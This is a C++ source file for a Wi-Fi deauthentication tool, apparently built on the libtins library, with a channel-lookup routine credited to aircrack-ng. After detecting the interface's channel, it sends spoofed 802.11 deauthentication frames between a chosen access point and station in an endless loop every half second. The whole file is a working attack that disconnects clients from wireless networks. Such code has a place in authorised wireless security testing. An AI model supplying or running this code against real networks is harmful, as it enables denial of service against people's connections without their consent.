#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/wireless.h>
#include <unistd.h>
#include "deauther.h"

Deauther::Deauther(string _iface,string _AP,string _Station)
    : iface(_iface),AP(_AP),Station(_Station)
{}

// Refer to the source code of aircrack-ng.
int getChannelFromFrequency(int frequency)
{
    if (frequency >= 2412 && frequency <= 2472)
        return (frequency - 2407) / 5;
    else if (frequency == 2484)
        return 14;
    else if (frequency >= 5000 && frequency <= 6100)
        return (frequency - 5000) / 5;
    else
        return -1;
}
int Deauther::GetFreq(void)
{
    int freq;
    struct iwreq wrq;
    int skfd = socket(AF_INET,SOCK_STREAM,0);
    memset(&wrq, 0 , sizeof(wrq));
    strncpy(wrq.ifr_name, iface.name().c_str(), IFNAMSIZ);
    if(ioctl(skfd,SIOCGIWFREQ,&wrq) < 0)
        return -1;
    close(skfd);
    freq = wrq.u.freq.m;
    if (freq > 100000000)
        freq /= 100000;
    else if (freq > 1000000)
        freq /= 1000;

    if(freq > 1000)
        return getChannelFromFrequency(freq);
    else
        return freq;
}

void Deauther::Start()
{
    int channel;
    PacketSender sender;

    if((channel = GetFreq()) < 0)
        return;
    cout << "Interface " << iface << endl;
    cout << "AP        " << AP << endl;
    cout << "Station   " << Station << endl;
    cout << "Channel   " << channel << endl;
    try{
        RadioTap r = RadioTap() / Dot11Deauthentication(Station,AP);
        r.channel(Utils::channel_to_mhz(channel),0x00a0);
        while(1){
            cout << "Deauth" << endl;
            sender.send(r,iface);
            usleep(500000);
        }
    } catch(exception e) {
        return;
    }
}

